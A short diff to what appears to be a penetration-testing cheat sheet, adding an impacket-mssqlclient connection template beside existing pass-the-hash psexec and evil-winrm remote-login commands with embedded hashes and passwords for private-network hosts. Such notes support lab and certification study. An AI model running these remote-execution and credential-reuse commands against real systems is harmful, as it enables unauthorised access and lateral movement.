@@ -29,3 +29,7 @@ impacket-psexec administrator@10.0.0.25 -hashes aad3b435b51404eeaad3b435b51404ee
 ```bash
 evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
 ```
+# mssql-client
+```bash
+impacket-mssqlclient $(DOMAIN)/$(USERNAME):'$(PASSWORD)'@$(IP_ADDRESS)
+```
